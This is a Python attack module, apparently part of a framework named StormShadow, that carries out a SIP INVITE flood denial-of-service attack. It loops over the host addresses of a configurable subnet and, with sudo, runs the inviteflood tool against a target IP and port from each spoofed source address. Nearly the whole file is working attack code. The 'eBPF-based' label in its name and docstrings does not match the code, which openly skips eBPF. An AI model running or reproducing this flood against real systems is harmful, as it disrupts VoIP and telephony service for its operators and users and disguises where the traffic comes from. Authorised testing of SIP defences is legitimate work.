"""
eBPF-based InviteFlood Attack Module.

This module implements a high-performance SIP InviteFlood attack with IP spoofing.
Instead of complex eBPF packet interception, it directly uses different source IPs
for each inviteflood call, providing better reliability and performance.
"""

from pathlib import Path
from typing import List, Optional
import ipaddress
import time
from utils.attack.attack_enums import AttackProtocol, AttackType
from utils.config.config import Parameters
from utils.core.logs import print_error, print_info, print_warning
from utils.interfaces.attack_interface import AttackInterface
from utils.registry.metadata import ModuleInfo
from utils.core.command_runner import run_command_str


class InviteFloodAttackEbpf(AttackInterface):
    """
    eBPF-based SIP INVITE Flood Attack Module.
    
    This class implements a SIP INVITE flood attack with IP spoofing capabilities.
    Instead of using complex eBPF packet interception, it directly specifies different
    source IP addresses for each inviteflood command, providing better reliability.
    """

    def __init__(self, **params):
        """Initialize the eBPF InviteFlood attack with spoofing parameters."""
        
        # Attack metadata
        super().__init__(
            attack_type=AttackType.DDOS,
            attack_protocol=AttackProtocol.SIP,
            name="InviteFloodAttackEbpf",
            description="eBPF-based SIP INVITE Flood Attack Module using direct IP spoofing",
            version="1.0.0",
            requirements=["inviteflood"],
            **params
        )

        # Extract spoofing parameters
        self.spoofing_subnet = params.get('spoofing_subnet', '10.10.122.0/25')
        
        print_info(f"eBPF InviteFlood attack initialized with target: {self.target_ip}:{self.target_port}")

    def cleanup(self) -> None:
        """Clean up attack resources."""
        print_info("Cleaning up eBPF InviteFlood attack resources")

    def end(self):
        """End the attack and cleanup."""
        print_info("Ending the eBPF InviteFlood attack")
        print_info("Cleaning up resources used by the eBPF InviteFlood attack")
        self.cleanup()

    def run(self) -> None:
        """Execute the InviteFlood attack with IP spoofing."""
        print_info("Running eBPF InviteFlood attack")
        
        if self.dry_run:
            print_info("Dry run mode: would execute inviteflood command with IP spoofing")
            print_info(f"Would attack target: {self.target_ip}:{self.target_port}")
            print_info(f"Would use IP spoofing with subnet: {self.spoofing_subnet}")
            return
            
        try:
            # Get spoofed IPs from the subnet for direct IP spoofing
            if not self.spoofing_subnet:
                print_error("No spoofing subnet configured")
                return
            
            spoofed_ips = list(ipaddress.ip_network(self.spoofing_subnet).hosts())
            
            # Send packets from different spoofed IPs 
            packets_per_ip = max(1, self.max_count // len(spoofed_ips))
            remaining_packets = self.max_count
            
            print_info(f"Spoofing from {len(spoofed_ips)} different IPs in subnet {self.spoofing_subnet}")
            
            for i, spoofed_ip in enumerate(spoofed_ips):
                if remaining_packets <= 0:
                    break
                    
                # Calculate how many packets to send from this IP
                packets_this_round = min(packets_per_ip, remaining_packets)
                if i == len(spoofed_ips) - 1:  # Last IP gets any remaining packets
                    packets_this_round = remaining_packets
                
                print_info(f"Sending {packets_this_round} packets from {spoofed_ip}")
                
                command = (
                    f"inviteflood "
                    f"{self.interface} "
                    f'200 '  # target user
                    f"{self.target_ip} "  # target domain (using IP)
                    f"{self.target_ip} "  # IPv4 addr of flood target
                    f"{packets_this_round} "  # number of packets from this IP
                    f"-i {spoofed_ip} "  # source IP address (spoofed)
                    f"-S {self.source_port} "  # source port
                    f"-D {self.target_port} "  # destination port
                    f"-s {self.delay} "  # delay between packets
                )
                
                try:
                    run_command_str(command, want_sudo=True, capture_output=False, check=True)
                    remaining_packets -= packets_this_round
                    
                    # Small delay between different source IPs to avoid overwhelming
                    if remaining_packets > 0:
                        time.sleep(0.1)
                        
                except Exception as e:
                    print_warning(f"Failed to send packets from {spoofed_ip}: {e}")
                    continue
                    
        except Exception as e:
            print_error(f"Failed to run eBPF InviteFlood attack: {e}")
            self.cleanup()
            return

    def stop(self) -> None:
        """Stop the attack."""
        print_info("Stopping eBPF InviteFlood attack")
        print_info("Ending the attack and cleanup resources by default")
        self.end()
    
    def get_attack_description(self) -> str:
        """Get attack description."""
        return ("This is an eBPF-based InviteFlood attack module that uses direct IP spoofing. "
                "It sends SIP INVITE packets from multiple source IP addresses in a specified subnet, "
                "providing better reliability than complex eBPF packet interception.")


# Module metadata for the attack registry
MODULE_INFO = ModuleInfo(
    name="InviteFloodAttackEbpf",
    description="eBPF-based SIP INVITE Flood Attack with direct IP spoofing",
    version="1.0.0",
    author="StormShadow",
    attack_type=AttackType.DDOS,
    attack_protocol=AttackProtocol.SIP,
    requirements=["inviteflood"],
)
